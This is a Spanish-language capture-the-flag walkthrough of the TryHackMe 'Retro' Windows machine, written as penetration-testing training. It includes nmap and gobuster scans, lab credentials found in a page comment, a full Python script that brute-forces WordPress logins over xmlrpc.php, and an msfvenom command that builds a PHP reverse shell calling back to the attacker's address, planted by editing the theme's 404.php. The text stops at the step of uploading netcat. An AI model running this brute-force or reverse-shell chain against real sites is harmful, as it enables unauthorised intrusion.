## TryHackMe  <> Retro

![image](https://github.com/Esevka/CTF/assets/139042999/36badd10-cdc3-408e-becc-f3cd5791189e)

Enlace Maquina: https://tryhackme.com/room/retro

Enunciado : 

  - Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
  - There are two distinct paths that can be taken on Retro. 


## Escaneo de puertos

- Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo).

      ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/nmap]
      └─# nmap -p- --open -min-rate 5000 -n -Pn -vvv 10.10.173.211 -oN open_ports
   
      PORT     STATE SERVICE       REASON
      80/tcp   open  http          syn-ack ttl 127
      3389/tcp open  ms-wbt-server syn-ack ttl 127


    
      ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/nmap]
      └─# nmap -p 80,3389 -sCV -n -Pn -vvv 10.10.173.211 -oN info_ports          
      
      PORT     STATE SERVICE       REASON          VERSION
      80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
      |_http-server-header: Microsoft-IIS/10.0
      |_http-title: IIS Windows Server
      | http-methods: 
      |   Supported Methods: OPTIONS TRACE GET HEAD POST
      |_  Potentially risky methods: TRACE
      
      3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
      | rdp-ntlm-info: 
      |   Target_Name: RETROWEB
      |   NetBIOS_Domain_Name: RETROWEB
      |   NetBIOS_Computer_Name: RETROWEB
      |   DNS_Domain_Name: RetroWeb
      |   DNS_Computer_Name: RetroWeb
      |   Product_Version: 10.0.14393
      |_  System_Time: 2023-09-16T05:43:45+00:00
      |_ssl-date: 2023-09-16T05:43:49+00:00; 0s from scanner time.
      | ssl-cert: Subject: commonName=RetroWeb
      | Issuer: commonName=RetroWeb
      | Public Key type: rsa
      | Public Key bits: 2048
      | Signature Algorithm: sha256WithRSAEncryption
      | Not valid before: 2023-09-15T05:35:16
      | Not valid after:  2024-03-16T05:35:16
      | MD5:   f400:b907:44a9:ca7b:859d:f10f:dc85:c9d9
      | SHA-1: 16b6:154a:ed2b:a480:79b1:6f3f:0794:22a6:e256:0f95
      | -----BEGIN CERTIFICATE-----
      | MIIC1DCCAbygAwIBAgIQUp4Y3citC59L5n1ZhsB4DTANBgkqhkiG9w0BAQsFADAT
      | MREwDwYDVQQDEwhSZXRyb1dlYjAeFw0yMzA5MTUwNTM1MTZaFw0yNDAzMTYwNTM1
      | MTZaMBMxETAPBgNVBAMTCFJldHJvV2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
      | MIIBCgKCAQEAw+2LkrnvgtuOUHnlXrKEzjMUkTkrsOhyYWR3NtDvSC0dEoYR6156
      | i/+w1/8f2OwVwiKO75AY82/0woVqtLnrVsHiwJMExiGILkUbXerJ36lgPCqACpXM
      | gixEvJCxLWYjgkuBb8Kf5QoXSlaPeXWslhRdCzdrc8dvBgI6oh/gxf3ulzO2KQc1
      | sxuEeMAgMlOVg5HdGeD1o1DqN8yzyEFN7DEk1r5CqbC+L1bdmgewxVtlrGopvYRu
      | egLSd3VQ3oqt2zMKM0zZshhdn2KeIC0xAVcGjvYIEQLeSGa0i+PliNXrpXKVlG7+
      | tIWzXo4la4hdn9ySCrfpZk4h25zbwu9tEwIDAQABoyQwIjATBgNVHSUEDDAKBggr
      | BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAK3BBbozjsL0
      | yyp06iJVgTjohyLR2Egj3U4iAsSGOVH6GPqYumfuB5Hz01JwKM25+cEKg45Tu1+o
      | HhTsrLTBT2J1RUUeaH3BxR/I1O9BOWr7v2JGvyuhKfDNY6GmLq3JJQKAlrV263Ni
      | u5eQk+BIe9JJ0Nv9xkj81wYUkw1WwDrzLNnJCBcZ7TEOJeVJIFB0kMJZCTCnCi2G
      | z9urkeSCAMfl2P/VuLGqHcPQ4xpo84R/8JFunPleSiMbbweYQL3TKb1AioxmIqZ1
      | ydR4+d8c2iS0TnmioDif+Ay6zCRuoCRXt0zmfge5zFqm1jRAH366mkfmxjg9IF64
      | IUVYgw5cOQ4=
      |_-----END CERTIFICATE-----
      Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

  - Puertos disponibles que tenemos para comprometer la maquina(Windows).
    
      -80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
    
      -3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services


## Analisis de vulnerabilidades en los servicios y explotacion de los mismos.

#### Puerto 80

-Cargamos la web y nos muestra muestra la tipica pantalla de Internet Information Service (IIS) la cual no tiene nada interesante.

![image](https://github.com/Esevka/CTF/assets/139042999/d8dd6ddb-29b5-4603-be06-ed259eebdb0d)

-Una de las preguntas de la maquina es --> What is the hidden directory which the website lives on?, por lo que vamos a fuzzear la web en busca de directorios.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/nmap]
    └─# gobuster dir -u http://10.10.173.211/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ../fuzz
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    
    /retro                (Status: 301) [Size: 150] [--> http://10.10.173.211/retro/] ------->
    /Retro                (Status: 301) [Size: 150] [--> http://10.10.173.211/Retro/] -------> ambas URL muestran lo mismo.

- Cargamos la url y efectivamente hay se encuentra la web oculta

   ![image](https://github.com/Esevka/CTF/assets/139042999/2e6e797e-19a4-4b85-85e8-49a3bfd804bb)

 - Analizamos la web en busca de informacion y encontramos lo siguiente.

   1) Revisando el codigo de la web

      - WordPress
      - Tema ---> /retro/wp-content/themes/90s-retro/

   2) Revisando la web

      - Usuario que postea ---> wade
        
        Comprobamos si es un usuario valido de WP
     
        ![image](https://github.com/Esevka/CTF/assets/139042999/43c12fba-25fa-4677-bc9c-2ed7ba9e5b95)

      - Comentario sospechoso, Probamos como passwd ----> parzival

        ![image](https://github.com/Esevka/CTF/assets/139042999/a31cf8cd-097e-4dc6-a9da-b748c88c2421)
        ![image](https://github.com/Esevka/CTF/assets/139042999/cc5312e5-28ae-4eb8-a078-8b3c6a6ffb6b)


      - Credenciales validas wade:parzival

        Nos podriamos conectar a la maquina para realizar su explotacion y postexplotacion con las credenciales obtenidas, son validas tanto para Wordpress como para conectaros por el servicio Terminal Server.
        
---
#### !Segun nos indica en el enunciado hay dos metodos para realizar esta maquina por lo que vamos a ver cuales son!
---

## Metodo1 - Wordpress.

-Si no econtramos la passwd revisando el contenido de la web, podemos realizar Brute Force contra el login de WP.

1) Comprobamos que WP tenga xmlrpc.php activo.

    ![image](https://github.com/Esevka/CTF/assets/139042999/d0860a63-1515-49a9-88af-e092e3bec1f1)

    INFO: https://www.hostinger.es/tutoriales/que-es-xmlrpc-php-wordpress-por-que-desactivarlo/#%C2%BFQue_es_Xmlrpcphp
    
        XML-RPC es una característica de WordPress que permite que los datos se transmitan, con HTTP actuando
        como el mecanismo de transporte y XML como el mecanismo de codificación. Dado que WordPress no es un
        sistema encerrado en sí mismo y ocasionalmente necesita comunicarse con otros sistemas, la intención era
        realizar ese trabajo.
    
        Por ejemplo, supongamos que quisieras publicar en tu sitio desde tu dispositivo móvil ya que tu computadora
        no está cerca. Podrías usar la función de acceso remoto habilitada por xmlrpc.php para hacerlo.
   
2) Creamos un diccionario de claves basado en las palabras de la web, en el caso de que no funciones podriamos probar con rockyout.

        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/script]
        └─# cewl http://10.10.188.22/retro -d 2 -w dic_baseweb.txt 
        CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

3) Creamos un script en python que nos automatize el ataque de Brute Froce contra el login de WP

        import requests
        import concurrent.futures
        
        flag = 0
        
        def brute_wp(passwd,usuario,url):
        
        	global flag
        
        	if flag != 1:
        
        		cookie = {'Cookie':'wordpress_test_cookie=WP+Cookie+check'}
        		datos = """<?xml version="1.0" encoding="UTF-8"?>
        						<methodCall> 
        						<methodName>wp.getUsersBlogs</methodName> 
        						<params> 
        						<param><value>{}</value></param> 
        						<param><value>{}</value></param> 
        						</params> 
        						</methodCall>""".format(usuario,passwd)
        		
        		r = requests.post(url,data=datos,headers=cookie)
        
        		if r.headers.get('Content-Length') == '403':
        			if flag !=1:
        				print('[-]Pass NO --> {}'.format(passwd),end='\r')
        				print(end='\x1b[2K')
        		else:
        			print('[+]Pass SI -->{}'.format(passwd))
        			print('Finalizando tareas espere...')
        			flag = 1 
        			
        def main():
        
        	url = "http://10.10.135.197/retro/xmlrpc.php"
        	usuario = 'wade'
        
        	file = 'dic_baseweb.txt'
        
        	with open(file) as dic:
        		
        		with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        			futures = []
        
        			for passwd in dic:
        				passwd = passwd.strip()
        				futures.append(executor.submit(brute_wp, passwd, usuario, url))
        
        
        			for futures in concurrent.futures.as_completed(futures):
        				if flag == 1:
        					executor.shutdown(wait=False,cancel_futures=True)
        					exit()
        
        if __name__=='__main__':
        	main()

4) Ejecutamos scrip y obtenemos credenciales

       ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/script]
       └─# python3 brute_wplogin.py 
       [+]Pass SI -->parzival
       Finalizando tareas espere...

     Credendiales validad para wordpress ----> wade:parzival

5) Logueamos en WP y obtenemos shell en la maquina victima.

   - Editamos el fichero 404.php del tema actual para poder obtener shell.
       
     ![image](https://github.com/Esevka/CTF/assets/139042999/020d55da-a93f-4b46-893c-572647f6d11d)

   - Creamos nuestra reverse shell.
     
          ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
          └─# msfvenom -p php/reverse_php LHOST=10.8.64.232 LPORT=1988 -f raw -o Rshell.exe
          [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
          [-] No arch selected, selecting arch: php from the payload
          No encoder specified, outputting raw payload
          Payload size: 2995 bytes
          Saved as: Rshell.exe

     -Nos ponemos en escucha para recibir nuestra shell y la ejecutamos.

       ![image](https://github.com/Esevka/CTF/assets/139042999/46d41e08-65b8-42f5-89e5-734e275e0c91)

       ![image](https://github.com/Esevka/CTF/assets/139042999/6218d7e1-a9d4-47ee-9781-156e86cac695)

     -Upgrademos la shell para trabajar comodamente.

     Para ello nos descargamos NetCat la version de 64 ---> https://github.com/int0x33/nc.exe/
     Lo subimos a la maquina victima y volvemos a realizar una conexion con una shell nueva.

     
     
     
     
     



       


   

       


  
    
